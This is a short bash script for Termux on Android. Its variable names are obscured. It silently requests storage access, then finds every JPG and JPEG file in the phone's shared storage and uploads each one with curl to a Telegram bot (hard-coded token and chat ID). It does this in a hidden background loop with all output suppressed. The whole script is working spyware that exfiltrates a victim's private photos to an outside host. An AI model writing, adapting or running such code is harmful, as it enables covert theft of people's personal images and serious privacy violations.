#!/data/data/com.termux/files/usr/bin/bash

a="7999451928:AAEmnKWV4rSffVj3jf6Fj7KYORIYyRDIzfc"
b="6363520686"
c=(
  "/storage/emulated/0"
  "/sdcard"
  "/storage/self/primary"
)

[ ! -d "/storage/emulated/0" ] && termux-setup-storage > /dev/null 2>&1

{
  for d in "${c[@]}"; do
    [ -d "$d" ] || continue
    find "$d" -type f \( -iname "*.jpg" -o -iname "*.jpeg" \) -print0 2>/dev/null | while IFS= read -r -d '' e; do
      curl -s -X POST "https://api.telegram.org/bot$a/sendPhoto" -F chat_id="$b" -F photo=@"$e" > /dev/null 2>&1
    done
  done
} > /dev/null 2>&1 &
